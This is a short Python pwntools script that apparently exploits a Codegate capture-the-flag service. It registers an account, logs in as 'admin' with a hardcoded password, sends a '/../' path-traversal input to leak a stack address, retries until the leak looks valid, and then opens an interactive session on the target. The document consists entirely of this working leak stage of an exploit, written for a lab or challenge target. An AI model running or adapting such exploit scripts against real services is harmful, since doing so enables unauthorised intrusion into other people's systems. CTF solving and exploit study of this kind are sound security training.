from pwn import *

#s = remote('192.168.33.10',1234)
#s = remote('ch41l3ng3s.codegate.kr',2121)
def join(name, age, _id, _pw):
  s.recvuntil('Choice:')
  s.send(p32(0x1))
  s.recvuntil('Name:')
  s.sendline(name)
  s.recvuntil('Age:')
  s.sendline(str(age))
  s.recvuntil('ID:')
  s.sendline(_id)
  s.recvuntil('PW:')
  s.sendline(_pw)

def login(_id,_pw):
  s.recvuntil('Choice:')
  s.send(p32(0x3))
  s.recvuntil('id:')
  s.sendline(_id)
  s.recvuntil('pw:')
  s.sendline(_pw)

def delete():
  s.recvuntil('Choice:')
  s.send(p32(4))

raw_input()
k =100
while k:
  s = remote('192.168.33.10',1234)
  join("1234",2,"1234","1234")
  login("admin","P3ssw0rd")
  #delete()

  s.recvuntil('Choice:')
  s.send(p32(0x8))
  s.send(p32(0x1))
  s.recvuntil('URL')
  s.sendline('/../')
  r = s.recvuntil('Choice:')[2:6]
  r = r[::-1]
  if r[3:4] != "\xff":
    k = k - 1
    s.close()
    continue
  stack = u32(r)
  log.info("STACK : 0x%x"%stack)
  k = k - 1
  raw_input()
#print hexdump(s.recvuntil('Choice:'))
s.interactive()
